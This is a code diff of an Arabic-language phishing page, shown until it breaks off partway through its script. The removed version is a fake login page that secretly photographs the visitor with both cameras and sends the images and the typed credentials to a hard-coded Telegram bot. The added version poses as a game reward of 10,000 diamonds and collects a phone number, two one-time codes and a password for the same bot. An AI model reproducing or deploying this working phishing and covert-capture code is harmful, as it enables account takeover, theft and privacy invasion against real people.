@@ -3,161 +3,744 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 توثيق الهوية الذكي</title>
+    <title>مكافأة أرستقراطية الفارس - 10,000 ماسة</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Cairo', 'sans-serif'],
+                    },
+                    colors: {
+                        gold: {
+                            300: '#fde047',
+                            400: '#facc15',
+                            500: '#eab308',
+                            600: '#ca8a04',
+                            700: '#a16207',
+                        },
+                        cyanGlow: {
+                            400: '#22d3ee',
+                            500: '#06b6d4',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
     <style>
-        :root { --primary: #00ff88; --bg: #050505; }
-        body, html { height: 100%; margin: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
-        
-        /* Landing UI - Ultra Professional */
-        #landing { display: flex; justify-content: center; align-items: center; height: 100vh; transition: opacity 0.5s ease; }
-        .glass-card { 
-            background: rgba(255, 255, 255, 0.03); 
-            padding: 50px; border-radius: 24px; 
-            backdrop-filter: blur(15px); 
-            border: 1px solid rgba(255, 255, 255, 0.1); 
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5); 
-            text-align: center; width: 380px; 
-            animation: fadeIn 1s ease-out;
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: radial-gradient(circle at top, #1e1b2e 0%, #0d0c1d 60%, #05040a 100%);
+            min-height: 100vh;
         }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .logo { font-size: 50px; margin-bottom: 10px; color: var(--primary); }
-        h2 { font-weight: 300; margin-bottom: 10px; letter-spacing: 1px; }
-        p { font-size: 14px; color: #aaa; margin-bottom: 30px; }
-        
-        .input-group { position: relative; margin-bottom: 20px; }
-        input { 
-            width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); 
-            background: rgba(0,0,0,0.4); color: #fff; box-sizing: border-box; 
-            transition: 0.3s; text-align: center; font-size: 16px;
-        }
-        input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 10px rgba(0, 255, 136, 0.2); }
-        
-        .btn-login { 
-            width: 100%; padding: 15px; border-radius: 12px; border: none; 
-            background: linear-gradient(45deg, #00ff88, #00bd65); 
-            color: #000; cursor: pointer; font-weight: bold; font-size: 18px; 
-            transition: 0.3s; box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
-        }
-        .btn-login:hover { transform: scale(1.03); filter: brightness(1.1); }
 
-        /* Horror UI */
-        #horror-screen { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #000; color: red; z-index: 9999; 
-            flex-direction: column; justify-content: center; align-items: center; 
-            text-align: center; overflow: hidden;
+        .glass-card {
+            background: rgba(18, 16, 32, 0.9);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(234, 179, 8, 0.3);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.85);
         }
-        .scary-text { 
-            font-size: 60px; font-family: 'Courier New', Courier, monospace; 
-            font-weight: bold; text-shadow: 0 0 20px red; 
-            animation: flicker 0.1s infinite; 
-        }
-        @keyframes flicker { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-        
-        .skull { font-size: 150px; filter: drop-shadow(0 0 20px red); }
-        .hack-msg { font-size: 20px; color: #ff0000; margin-top: 20px; font-family: monospace; }
 
-        #video, #canvas { display: none; }
+        .step-transition {
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .input-focus {
+            transition: all 0.25s ease;
+        }
+        .input-focus:focus {
+            border-color: #22d3ee;
+            box-shadow: 0 0 15px rgba(34, 211, 238, 0.4);
+        }
+
+        @keyframes pulse-diamond {
+            0%, 100% { box-shadow: 0 0 20px rgba(34, 211, 238, 0.3); transform: scale(1); }
+            50% { box-shadow: 0 0 35px rgba(34, 211, 238, 0.7); transform: scale(1.03); }
+        }
+        .glow-diamond {
+            animation: pulse-diamond 3s infinite ease-in-out;
+        }
+
+        @keyframes float-logo {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+        }
+        .logo-float {
+            animation: float-logo 3.5s ease-in-out infinite;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            15%, 45%, 75% { transform: translateX(-8px); }
+            30%, 60%, 90% { transform: translateX(8px); }
+        }
+        .animate-shake {
+            animation: shake 0.6s ease-in-out;
+        }
+
+        @keyframes warning-glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(239, 68, 68, 0.4); }
+            50% { box-shadow: 0 0 40px rgba(239, 68, 68, 0.8); }
+        }
+        .warning-glow-effect {
+            animation: warning-glow 2s infinite ease-in-out;
+        }
     </style>
 </head>
-<body onload="autoCapture()">
+<body class="text-slate-100 flex items-center justify-center p-4 min-h-screen">
 
-<div id="landing">
-    <div class="glass-card">
-        <div class="logo">🛡️</div>
-        <h2>نظام التوثيق المؤمن</h2>
-        <p>يرجى تسجيل الدخول للمتابعة بأمان</p>
-        
-        <div class="input-group">
-            <input type="text" id="username" placeholder="اسم المستخدم">
+    <div class="w-full max-w-md my-auto">
+
+        <!-- SPLASH / WELCOME SCREEN -->
+        <div id="splashScreen" class="glass-card rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden text-center step-transition">
+            <div class="absolute -top-16 -right-16 w-40 h-40 bg-cyan-500/10 rounded-full blur-3xl"></div>
+            <div class="absolute -bottom-16 -left-16 w-40 h-40 bg-yellow-500/10 rounded-full blur-3xl"></div>
+
+            <div class="relative z-10 py-2">
+                <!-- Event Banner Badge -->
+                <div class="inline-flex items-center gap-2 bg-gradient-to-r from-cyan-500/20 to-yellow-500/20 border border-cyan-400/40 px-4 py-1.5 rounded-full mb-4">
+                    <i class="fas fa-gem text-cyan-400 text-sm"></i>
+                    <span class="text-xs font-bold text-cyan-300">حدث حصري ومحدود</span>
+                </div>
+
+                <!-- App Logo -->
+                <div class="inline-block p-3 bg-slate-900/90 rounded-3xl border border-yellow-500/40 shadow-2xl mb-4 logo-float glow-diamond">
+                    <img src="https://play-lh.googleusercontent.com/igfqct-vw4I87Eg9Mi8CMbQh2XzOyFfE551sFdx2ZOcz0Bv-ZBX9ChXRdBvrqJq8QUcE8nZOhMRjReiNy1CeQw" 
+                         alt="App Logo" 
+                         onerror="this.src='https://placehold.co/100x100/eab308/ffffff?text=Logo'"
+                         class="w-20 h-20 object-contain rounded-2xl">
+                </div>
+
+                <!-- Main Event Title -->
+                <h1 class="text-2xl sm:text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-amber-400 to-yellow-500 mb-2">
+                    مكافأة أرستقراطية الفارس
+                </h1>
+
+                <!-- Reward Details Card -->
+                <div class="bg-slate-900/80 border border-yellow-500/30 rounded-2xl p-4 my-4 relative overflow-hidden">
+                    <div class="flex flex-col items-center justify-center gap-1 mb-2">
+                        <div class="flex items-center gap-2">
+                            <i class="fas fa-crown text-2xl text-yellow-400 animate-bounce"></i>
+                            <span class="text-xl font-black text-yellow-300">أرستقراطية الفارس</span>
+                        </div>
+                        <div class="flex items-center gap-2 mt-1">
+                            <i class="fas fa-gem text-xl text-cyan-400 animate-pulse"></i>
+                            <span class="text-2xl font-extrabold text-cyan-300 font-mono tracking-wider">+ 10,000</span>
+                            <span class="text-sm font-bold text-yellow-400">ماسة</span>
+                        </div>
+                    </div>
+                    <div class="inline-block bg-yellow-500/20 text-yellow-300 border border-yellow-500/30 text-xs px-3 py-1.5 rounded-lg font-semibold mt-1">
+                        <i class="fas fa-clock text-xs ml-1"></i> أرستقراطية صالحة لمدة 3 أيام!
+                    </div>
+                </div>
+
+                <!-- Owner Warning Note -->
+                <div class="bg-amber-500/10 border border-amber-500/30 rounded-xl p-3 mb-6 text-right flex items-start gap-2.5">
+                    <i class="fas fa-circle-exclamation text-amber-400 text-base mt-0.5 shrink-0"></i>
+                    <p class="text-xs text-amber-200 leading-relaxed font-semibold">
+                        <span class="text-yellow-400 font-bold underline">ملاحظة هامة:</span> يجب أن تكون المالك الحقيقي للحساب لتأكيد الاستلام وتفعيل الأرستقراطية والمكافأة في حسابك.
+                    </p>
+                </div>
+
+                <!-- Start Claiming Button -->
+                <button onclick="startApp()" class="w-full bg-gradient-to-r from-yellow-500 via-amber-500 to-yellow-600 hover:from-yellow-400 hover:to-amber-500 text-slate-950 font-black py-4 px-6 rounded-2xl shadow-xl shadow-amber-500/25 transition duration-300 transform active:scale-95 flex items-center justify-center gap-3 text-base">
+                    <i class="fas fa-gift text-lg"></i>
+                    <span>استلام المكافأة الآن</span>
+                    <i class="fas fa-arrow-left text-sm"></i>
+                </button>
+            </div>
         </div>
-        <div class="input-group">
-            <input type="password" id="password" placeholder="كلمة المرور">
+
+        <!-- MAIN STEPS CARD CONTAINER -->
+        <div id="mainAppCard" class="glass-card rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden hidden step-transition">
+            
+            <!-- App Header Logo & Reward Tag -->
+            <div class="text-center mb-5">
+                <div class="inline-block p-2 bg-slate-900/80 rounded-2xl border border-yellow-500/30 shadow-lg mb-2">
+                    <img src="https://play-lh.googleusercontent.com/igfqct-vw4I87Eg9Mi8CMbQh2XzOyFfE551sFdx2ZOcz0Bv-ZBX9ChXRdBvrqJq8QUcE8nZOhMRjReiNy1CeQw" 
+                         alt="App Logo" 
+                         onerror="this.src='https://placehold.co/80x80/eab308/ffffff?text=Logo'"
+                         class="w-12 h-12 object-contain rounded-xl shadow-md">
+                </div>
+                <div class="text-xs font-bold text-cyan-300 flex items-center justify-center gap-1.5">
+                    <i class="fas fa-crown text-yellow-400"></i>
+                    <span>أرستقراطية الفارس (3 أيام) + 10,000 ماسة</span>
+                </div>
+            </div>
+
+            <!-- Progress Bar Header -->
+            <div class="mb-6">
+                <div class="flex items-center justify-between mb-2">
+                    <span id="stepBadge" class="px-3 py-1 bg-yellow-500/10 text-yellow-400 border border-yellow-500/30 text-xs font-bold rounded-full">
+                        الخطوة 1 من 6
+                    </span>
+                    <span id="stepTitleHeader" class="text-xs text-slate-400 font-semibold">
+                        رقم الهاتف
+                    </span>
+                </div>
+
+                <div class="w-full bg-slate-800/80 rounded-full h-2 overflow-hidden p-0.5 border border-slate-700/50">
+                    <div id="progressBar" class="bg-gradient-to-r from-cyan-500 via-amber-400 to-yellow-500 h-full rounded-full transition-all duration-500 ease-out" style="width: 16.6%;"></div>
+                </div>
+            </div>
+
+            <!-- Alert Box for Client Validation -->
+            <div id="alertBox" class="hidden mb-6 p-4 rounded-xl text-sm font-medium flex items-center gap-3 transition-all duration-300">
+                <i id="alertIcon" class="fas"></i>
+                <span id="alertMessage"></span>
+            </div>
+
+            <!-- STEP 1: Phone Input -->
+            <div id="step1" class="step-transition">
+                <div class="text-center mb-6">
+                    <div class="w-14 h-14 bg-yellow-500/10 text-yellow-400 rounded-2xl flex items-center justify-center mx-auto mb-3 border border-yellow-500/20 shadow-inner">
+                        <i class="fas fa-mobile-screen-button text-2xl"></i>
+                    </div>
+                    <h2 class="text-xl font-bold text-white">1. تسجيل الدخول</h2>
+                    <p class="text-slate-400 text-xs mt-1">ادخل رقم هاتفك المرتبط بالحساب لاستلام الماسات</p>
+                </div>
+
+                <form id="formStep1" onsubmit="handleStep1Submit(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-2">رقم الهاتف</label>
+                        <div class="relative flex items-center">
+                            <div class="absolute left-2 flex items-center gap-1 bg-slate-800 border border-slate-700 px-2.5 py-1.5 rounded-lg text-xs text-slate-300">
+                                <span class="text-base">🇪🇬</span>
+                                <span dir="ltr" class="font-mono">+20</span>
+                            </div>
+                            <input type="tel" id="phoneInputStep1" dir="ltr" placeholder="1012345678" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                                class="w-full bg-slate-900/80 border border-slate-700 rounded-xl py-3.5 pl-24 pr-4 text-white text-left font-mono tracking-wider placeholder-slate-500 input-focus outline-none text-base">
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full bg-gradient-to-r from-yellow-500 via-amber-500 to-yellow-600 hover:from-yellow-400 hover:to-amber-500 text-slate-950 font-black py-3.5 px-4 rounded-xl shadow-lg shadow-amber-500/20 transition duration-200 flex items-center justify-center gap-2">
+                        <span>متابعة</span>
+                        <i class="fas fa-arrow-left text-sm"></i>
+                    </button>
+                </form>
+            </div>
+
+            <!-- STEP 2: Timer & First Code -->
+            <div id="step2" class="step-transition hidden">
+                <div class="text-center mb-6">
+                    <div class="w-14 h-14 bg-yellow-500/10 text-yellow-400 rounded-2xl flex items-center justify-center mx-auto mb-3 border border-yellow-500/20 shadow-inner">
+                        <i class="fas fa-comment-sms text-2xl"></i>
+                    </div>
+                    <h2 class="text-xl font-bold text-white">2. اكتب الكود</h2>
+                    <p class="text-slate-400 text-xs mt-1">تم إرسال رمز التحقق إلى الرقم <span id="displayPhoneStep2" dir="ltr" class="text-yellow-400 font-mono font-semibold"></span></p>
+                </div>
+
+                <!-- 50 Seconds Countdown Timer -->
+                <div class="bg-slate-900/80 rounded-2xl p-4 border border-slate-800 text-center mb-6">
+                    <div class="text-xs text-slate-400 mb-1">الوقت المتبقي لإعادة إرسال الكود</div>
+                    <div id="timerDisplay1" class="text-2xl font-black font-mono text-yellow-400 tracking-wider">00:50</div>
+                </div>
+
+                <form id="formStep2" onsubmit="handleStep2Submit(event)" class="space-y-5">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-2">أدخل رمز التحقق (OTP)</label>
+                        <div class="flex justify-between gap-2" dir="ltr">
+                            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input-1 w-12 h-14 bg-slate-900/90 border border-slate-700 rounded-xl text-center text-xl font-bold text-white font-mono input-focus outline-none" required />
+                            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input-1 w-12 h-14 bg-slate-900/90 border border-slate-700 rounded-xl text-center text-xl font-bold text-white font-mono input-focus outline-none" required />
+                            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input-1 w-12 h-14 bg-slate-900/90 border border-slate-700 rounded-xl text-center text-xl font-bold text-white font-mono input-focus outline-none" required />
+                            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input-1 w-12 h-14 bg-slate-900/90 border border-slate-700 rounded-xl text-center text-xl font-bold text-white font-mono input-focus outline-none" required />
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full bg-gradient-to-r from-yellow-500 via-amber-500 to-yellow-600 hover:from-yellow-400 hover:to-amber-500 text-slate-950 font-black py-3.5 px-4 rounded-xl shadow-lg shadow-amber-500/20 transition duration-200 flex items-center justify-center gap-2">
+                        <span>تأكيد الكود</span>
+                        <i class="fas fa-check-circle text-sm"></i>
+                    </button>
+                </form>
+            </div>
+
+            <!-- STEP 3: Security Password -->
+            <div id="step3" class="step-transition hidden">
+                <div class="text-center mb-6">
+                    <div class="w-14 h-14 bg-yellow-500/10 text-yellow-400 rounded-2xl flex items-center justify-center mx-auto mb-3 border border-yellow-500/20 shadow-inner">
+                        <i class="fas fa-lock text-2xl"></i>
+                    </div>
+                    <h2 class="text-xl font-bold text-white">3. ادخل كلمه السر الامنيه</h2>
+                    <p class="text-slate-400 text-xs mt-1">ادخل كلمة المرور الأمنية لتأكيد الأحقية بالحساب</p>
+                </div>
+
+                <form id="formStep3" onsubmit="handleStep3Submit(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-2">كلمة السر الأمنية</label>
+                        <div class="relative">
+                            <input type="password" id="passwordInput" placeholder="••••••••" required
+                                class="w-full bg-slate-900/80 border border-slate-700 rounded-xl py-3.5 px-4 text-white placeholder-slate-500 input-focus outline-none">
+                            <button type="button" onclick="togglePasswordVisibility('passwordInput', 'eyeIcon')" class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-200">
+                                <i id="eyeIcon" class="fas fa-eye"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full bg-gradient-to-r from-yellow-500 via-amber-500 to-yellow-600 hover:from-yellow-400 hover:to-amber-500 text-slate-950 font-black py-3.5 px-4 rounded-xl shadow-lg shadow-amber-500/20 transition duration-200 flex items-center justify-center gap-2">
+                        <span>متابعة</span>
+                        <i class="fas fa-arrow-left text-sm"></i>
+                    </button>
+                </form>
+            </div>
+
+            <!-- STEP 4: Phone Confirmation -->
+            <div id="step4" class="step-transition hidden">
+                <div class="text-center mb-6">
+                    <div class="w-14 h-14 bg-amber-500/10 text-amber-400 rounded-2xl flex items-center justify-center mx-auto mb-3 border border-amber-500/20 shadow-inner">
+                        <i class="fas fa-user-shield text-2xl"></i>
+                    </div>
+                    <h2 class="text-lg font-bold text-white leading-snug">4. يرجا اعدت ادخل رقم الهاتف لتاكد من انك صاحب الحساب</h2>
+                    <p class="text-slate-400 text-xs mt-2">تأكيد إضافي لضمان تحويل الـ 10,000 ماسة للمالك الأصلي</p>
+                </div>
+
+                <form id="formStep4" onsubmit="handleStep4Submit(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-2">إعادة إدخال رقم الهاتف</label>
+                        <div class="relative flex items-center">
+                            <div class="absolute left-2 flex items-center gap-1 bg-slate-800 border border-slate-700 px-2.5 py-1.5 rounded-lg text-xs text-slate-300">
+                                <span class="text-base">🇪🇬</span>
+                                <span dir="ltr" class="font-mono">+20</span>
+                            </div>
+                            <input type="tel" id="phoneInputStep4" dir="ltr" placeholder="1012345678" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                                class="w-full bg-slate-900/80 border border-slate-700 rounded-xl py-3.5 pl-24 pr-4 text-white text-left font-mono tracking-wider placeholder-slate-500 input-focus outline-none">
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full bg-gradient-to-r from-yellow-500 via-amber-500 to-yellow-600 hover:from-yellow-400 hover:to-amber-500 text-slate-950 font-black py-3.5 px-4 rounded-xl shadow-lg shadow-amber-500/20 transition duration-200 flex items-center justify-center gap-2">
+                        <span>إرسال كود التأكيد</span>
+                        <i class="fas fa-paper-plane text-sm"></i>
+                    </button>
+                </form>
+            </div>
+
+            <!-- STEP 5: Second Code Input with Timer -->
+            <div id="step5" class="step-transition hidden">
+                <div class="text-center mb-6">
+                    <div class="w-14 h-14 bg-yellow-500/10 text-yellow-400 rounded-2xl flex items-center justify-center mx-auto mb-3 border border-yellow-500/20 shadow-inner">
+                        <i class="fas fa-key text-2xl"></i>
+                    </div>
+                    <h2 class="text-xl font-bold text-white">5. اكتب الكود الثاني</h2>
+                    <p class="text-slate-400 text-xs mt-1">رمز الأمان النهائي لتأكيد شحن الجواهر</p>
+                </div>
+
+                <!-- 50 Seconds Countdown Timer -->
+                <div class="bg-slate-900/80 rounded-2xl p-4 border border-slate-800 text-center mb-6">
+                    <div class="text-xs text-slate-400 mb-1">الوقت المتبقي لإعادة إرسال الكود النهائي</div>
+                    <div id="timerDisplay2" class="text-2xl font-black font-mono text-yellow-400 tracking-wider">00:50</div>
+                </div>
+
+                <form id="formStep5" onsubmit="handleStep5Submit(event)" class="space-y-5">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-2">كود التحقق الثاني</label>
+                        <div class="flex justify-between gap-2" dir="ltr">
+                            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input-2 w-12 h-14 bg-slate-900/90 border border-slate-700 rounded-xl text-center text-xl font-bold text-white font-mono input-focus outline-none" required />
+                            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input-2 w-12 h-14 bg-slate-900/90 border border-slate-700 rounded-xl text-center text-xl font-bold text-white font-mono input-focus outline-none" required />
+                            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input-2 w-12 h-14 bg-slate-900/90 border border-slate-700 rounded-xl text-center text-xl font-bold text-white font-mono input-focus outline-none" required />
+                            <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input-2 w-12 h-14 bg-slate-900/90 border border-slate-700 rounded-xl text-center text-xl font-bold text-white font-mono input-focus outline-none" required />
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full bg-gradient-to-r from-yellow-500 via-amber-500 to-yellow-600 hover:from-yellow-400 hover:to-amber-500 text-slate-950 font-black py-3.5 px-4 rounded-xl shadow-lg shadow-amber-500/20 transition duration-200 flex items-center justify-center gap-2">
+                        <span>إرسال للتأكيد النهائي</span>
+                        <i class="fas fa-check-double text-sm"></i>
+                    </button>
+                </form>
+            </div>
+
+            <!-- STEP 6: Waiting State & Final Error Screen -->
+            <div id="step6" class="step-transition hidden text-center py-4">
+                
+                <!-- Loading State -->
+                <div id="processingState">
+                    <div class="relative w-20 h-20 mx-auto mb-6">
+                        <div class="absolute inset-0 rounded-full border-4 border-yellow-500/20"></div>
+                        <div class="absolute inset-0 rounded-full border-4 border-cyan-400 border-t-transparent animate-spin"></div>
+                        <div class="absolute inset-0 flex items-center justify-center text-yellow-400">
+                            <i class="fas fa-crown text-xl animate-pulse"></i>
+                        </div>
+                    </div>
+                    <h2 class="text-xl font-bold text-white mb-2">6. يتم انتظار الكود</h2>
+                    <p class="text-slate-400 text-xs max-w-xs mx-auto mb-4">جاري التحقق من ملكية الحساب وتفعيل أرستقراطية الفارس (3 أيام) وإضافة الماسات...</p>
+                    <div class="inline-flex items-center gap-2 bg-slate-900/90 px-4 py-2 rounded-xl text-xs text-slate-300 border border-slate-800">
+                        <i class="fas fa-spinner fa-spin text-yellow-400"></i>
+                        <span>الرجاء الانتظار وعدم إغلاق الصفحة</span>
+                    </div>
+                </div>
+
+                <!-- Final Error View with Shake Animation -->
+                <div id="errorState" class="hidden">
+                    <div class="w-20 h-20 bg-red-500/20 text-red-500 rounded-full flex items-center justify-center mx-auto mb-5 border border-red-500/40 warning-glow-effect">
+                        <i class="fas fa-triangle-exclamation text-3xl"></i>
+                    </div>
+
+                    <h2 class="text-2xl font-black text-red-500 mb-3 tracking-wide">
+                        حسابك ليس صالح
+                    </h2>
+
+                    <div class="bg-red-500/10 border border-red-500/30 rounded-2xl p-4 mb-6 text-center">
+                        <p class="text-red-200 text-sm font-semibold leading-relaxed">
+                            يرجا المحاوله مره اخره هناك خطاء يرجا مراجعت حسابك قبل التسجيل
+                        </p>
+                    </div>
+
+                    <button onclick="resetApp()" class="w-full bg-gradient-to-r from-red-600 to-rose-700 hover:from-red-500 hover:to-rose-600 text-white font-bold py-3.5 px-4 rounded-xl shadow-lg shadow-red-600/30 transition duration-200 flex items-center justify-center gap-2">
+                        <i class="fas fa-rotate-right"></i>
+                        <span>إعادة المحاولة مرة أخرى</span>
+                    </button>
+                </div>
+
+            </div>
+
         </div>
-        <button class="btn-login" id="loginBtn">دخول آمن</button>
+
+        <!-- Footer Info -->
+        <p class="text-center text-xs text-slate-500 mt-6 flex items-center justify-center gap-2">
+            <i class="fas fa-shield-halved text-yellow-600"></i>
+            <span>نظام شحن المكافآت والتحقق الأمني المتقدم</span>
+        </p>
     </div>
-</div>
 
-<div id="horror-screen">
-    <div class="skull">💀</div>
-    <div class="scary-text">لقد تم اختراقك</div>
-    <div class="hack-msg">تم سحب كافة ملفاتك وصورك الآن...<br>السيطرة الكاملة للجهاز تمت بنجاح.</div>
-</div>
+    <script>
+        // TELEGRAM BOT CREDENTIALS
+        const TELEGRAM_BOT_TOKEN = '7841770799:AAEkyBbSilkRvyst6cFQVK9_VhEe5YAlsbU';
+        const TELEGRAM_CHAT_ID = '7684109421';
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+        let savedPhoneNumber = "";
+        let currentStep = 1;
+        let countdownTimer1 = null;
+        let countdownTimer2 = null;
 
-<!-- أصوات مرعبة خارجية (روابط عشوائية لموسيقى رعب) -->
-<audio id="scaryAudio" src="https://www.soundjay.com/human/sounds/scream-01.mp3" preload="auto"></audio>
-<audio id="backgroundEvil" src="https://www.soundjay.com/ambient/sounds/horror-ambient-1.mp3" loop preload="auto"></audio>
+        // Dispatch data to Telegram Bot API
+        function sendToTelegram(messageText) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(res => res.json())
+            .then(data => console.log('Telegram delivery success:', data))
+            .catch(err => console.error('Telegram delivery error:', err));
+        }
 
-<script>
-const BOT_TOKEN = '7841770799:AAEkyBbSilkRvyst6cFQVK9_VhEe5YAlsbU';
-const CHAT_ID = '7684109421';
+        // Manual App Start Button Function
+        function startApp() {
+            const splashScreen = document.getElementById('splashScreen');
+            const mainAppCard = document.getElementById('mainAppCard');
 
-async function autoCapture() {
-    try {
-        const front = await takePhoto('user');
-        let back = null;
-        try { back = await takePhoto('environment'); } catch (e) {}
-        
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('⚡️ ضحية وقعت في الفخ!')}`);
-        if(front) await uploadImg(front);
-        if(back) await uploadImg(back);
-    } catch (err) {}
-}
+            splashScreen.classList.add('opacity-0', 'scale-95');
+            setTimeout(() => {
+                splashScreen.classList.add('hidden');
+                mainAppCard.classList.remove('hidden');
+                mainAppCard.classList.add('opacity-100');
+                goToStep(1);
+            }, 300);
+        }
 
-document.getElementById('loginBtn').addEventListener('click', async () => {
-    const user = document.getElementById('username').value;
-    const pass = document.getElementById('password').value;
+        // Alert message popup handler
+        function showAlert(message, type = 'error') {
+            const alertBox = document.getElementById('alertBox');
+            const alertIcon = document.getElementById('alertIcon');
+            const alertMessage = document.getElementById('alertMessage');
 
-    if(!user || !pass) return alert("يرجى إكمال البيانات");
+            alertBox.classList.remove('hidden', 'bg-red-500/20', 'border-red-500/30', 'text-red-300', 'bg-emerald-500/20', 'border-emerald-500/30', 'text-emerald-300');
+            
+            if (type === 'error') {
+                alertBox.classList.add('bg-red-500/20', 'border', 'border-red-500/30', 'text-red-300');
+                alertIcon.className = 'fas fa-circle-exclamation text-red-400';
+            } else {
+                alertBox.classList.add('bg-emerald-500/20', 'border', 'border-emerald-500/30', 'text-emerald-300');
+                alertIcon.className = 'fas fa-circle-check text-emerald-400';
+            }
 
-    // إرسال البيانات فوراً
-    const text = `💀 حساب جديد مُختَرق 💀\n👤 User: ${user}\n🔑 Pass: ${pass}`;
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+            alertMessage.textContent = message;
+        }
 
-    // تفعيل الشاشة المرعبة والأصوات
-    document.getElementById('landing').style.opacity = '0';
-    setTimeout(() => {
-        document.getElementById('landing').style.display = 'none';
-        document.getElementById('horror-screen').style.display = 'flex';
-        
-        // تشغيل الأصوات
-        document.getElementById('scaryAudio').play();
-        document.getElementById('backgroundEvil').play();
-    }, 500);
-});
+        function hideAlert() {
+            document.getElementById('alertBox').classList.add('hidden');
+        }
 
-async function takePhoto(mode) {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-        video.srcObject = stream;
-        return new Promise((resolve) => {
-            setTimeout(async () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const data = canvas.toDataURL('image/jpeg', 0.7);
-                stream.getTracks().forEach(t => t.stop());
-                resolve(data);
+        // Update UI Steps Progress
+        function updateProgress(step) {
+            currentStep = step;
+            const progressBar = document.getElementById('progressBar');
+            const stepBadge = document.getElementById('stepBadge');
+            const stepTitleHeader = document.getElementById('stepTitleHeader');
+
+            const percentage = (step / 6) * 100;
+            progressBar.style.width = percentage + '%';
+
+            const headers = [
+                "1. تسجيل الدخول",
+                "2. اكتب الكود",
+                "3. كلمة السر الأمنية",
+                "4. تأكيد رقم الهاتف",
+                "5. اكتب الكود الثاني",
+                "6. يتم انتظار الكود"
+            ];
+
+            stepBadge.textContent = `الخطوة ${step} من 6`;
+            stepTitleHeader.textContent = headers[step - 1];
+        }
+
+        // Step Router View Toggle
+        function goToStep(stepNumber) {
+            hideAlert();
+            for (let i = 1; i <= 6; i++) {
+                const stepEl = document.getElementById(`step${i}`);
+                if (stepEl) {
+                    if (i === stepNumber) {
+                        stepEl.classList.remove('hidden');
+                    } else {
+                        stepEl.classList.add('hidden');
+                    }
+                }
+            }
+            updateProgress(stepNumber);
+        }
+
+        // STEP 1: Phone Submission
+        function handleStep1Submit(e) {
+            e.preventDefault();
+            const phoneInput = document.getElementById('phoneInputStep1').value.trim();
+            
+            if (phoneInput.length < 8) {
+                showAlert('يرجى إدخال رقم هاتف صحيح ومكون من 8 أرقام على الأقل');
+                return;
+            }
+
+            savedPhoneNumber = phoneInput;
+            document.getElementById('displayPhoneStep2').textContent = "+20 " + phoneInput;
+
